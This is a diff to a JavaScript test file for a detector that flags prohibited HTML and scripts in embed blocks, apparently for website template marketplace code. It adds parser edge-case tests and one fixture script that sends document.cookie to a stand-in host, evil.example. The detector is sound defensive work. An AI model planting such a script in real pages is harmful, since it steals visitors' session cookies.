@@ -3,7 +3,9 @@ import fs from 'node:fs';
 import vm from 'node:vm';
 import {
   HTML_EMBED_POLICY,
+  HTML_EMBED_SCRIPT_POLICY,
   disallowedEmbedTags,
+  findHtmlEmbedScripts,
   findProhibitedHtmlEmbeds,
   findProhibitedMarketplaceCustomCode
 } from '../src/font-custom-code-policy.js';
@@ -44,7 +46,7 @@ assert.deepEqual(sources('<div class="w-embed-youtubevideo"><iframe src="https:/
 
 // Disallowed embed content.
 assert.deepEqual(sources(embed('map w-embed w-iframe', '<iframe src="https://www.google.com/maps/embed?pb=1"></iframe>')), ['.map: <iframe>']);
-assert.deepEqual(sources(embed('nest w-embed', '<div class="inner"><div><p>Deep</p></div></div><img src="x.png">')), ['.nest: <p>, <img>']);
+assert.deepEqual(sources(embed('nest w-embed', '<div class="inner"><div><p>Deep</p></div></div><img src="x.png">')), ['.nest: <p>, text, <img>, <div>']);
 assert.deepEqual(sources(embed('w-embed', '<audio src="x.mp3" controls></audio>')), ['div.w-embed: <audio>']);
 // Wrapper markup around an inline SVG icon (archinic.webflow.io, .interior_embed) is not foreign content.
 assert.deepEqual(sources(embed('interior_embed w-embed', '<div class="pxl-item--icon"> <span class="icon-default"> <svg viewBox="0 0 10 10"><path d="M0"/></svg> </span> </div>')), []);
@@ -53,6 +55,35 @@ assert.deepEqual(sources(embed('mixed w-embed w-script', '<script>init()</script
 // Sibling content after the embed is never attributed to it.
 assert.deepEqual(sources(`${embed('icon w-embed', '<svg></svg>')}<div class="after"><video></video></div>`), []);
 assert.deepEqual(sources(`${embed('one w-embed', '<video></video>')}${embed('two w-embed', '<audio></audio>')}`), ['.one: <video>', '.two: <audio>']);
+
+// Comments and raw-text content cannot move the embed boundary (Codex P1).
+assert.deepEqual(sources('<div class="w-embed"><!-- </div> --><video></video></div>'), ['div.w-embed: <video>']);
+assert.deepEqual(sources(`<div class="gs w-embed"><script>const end = '</div>';</script><video></video></div>`), ['.gs: <video>']);
+assert.deepEqual(sources(`<div class="gs w-embed"><script>const open = '<div>';</script><svg></svg></div><div class="after"><video></video></div>`), [], 'tag-like text in a script does not swallow siblings');
+assert.deepEqual(sources('<div class="q w-embed"><span title="a > b"><svg></svg></span></div>'), [], 'quoted ">" in an attribute does not end the tag');
+
+// div/span wrappers are only inert around permitted content (Codex P1).
+assert.deepEqual(sources(embed('layout w-embed', '<div style="position:fixed"><span>Custom content</span></div>')), ['.layout: text, <div>, <span>']);
+assert.deepEqual(sources(embed('words w-embed', 'Just some text')), ['.words: text']);
+assert.deepEqual(sources(embed('icon w-embed', '&nbsp;<span><svg></svg></span>')), [], 'whitespace entities are not content');
+
+// HTML inside SVG foreignObject is not inert SVG (Codex P2).
+assert.deepEqual(sources(embed('fo w-embed', '<svg><foreignObject><video src="x.mp4"></video></foreignObject></svg>')), ['.fo: <foreignObject>']);
+
+// Embed scripts are reported separately for consumers without the GSAP script checks (Codex P2).
+const scriptFindings = findHtmlEmbedScripts(
+  embed('track w-embed', '<script>fetch("https://evil.example/" + document.cookie)</script>') +
+    embed('lib w-embed', '<script src="https://cdn.example/x.js"></script><svg></svg>') +
+    embed('icon w-embed', '<svg></svg>')
+);
+assert.deepEqual(scriptFindings.map((finding) => finding.source), ['.track: inline script', '.lib: https://cdn.example/x.js']);
+assert.ok(scriptFindings.every((finding) => finding.policy === HTML_EMBED_SCRIPT_POLICY));
+assert.ok(
+  !findProhibitedMarketplaceCustomCode(embed('track w-embed', '<script>init()</script>')).some(
+    (finding) => finding.policy === HTML_EMBED_SCRIPT_POLICY
+  ),
+  'the GSAP worker path judges embed scripts itself'
+);
 
 assert.deepEqual(disallowedEmbedTags('<SVG><path/></SVG><VIDEO controls></VIDEO>'), ['video'], 'tag names are case-insensitive');
 
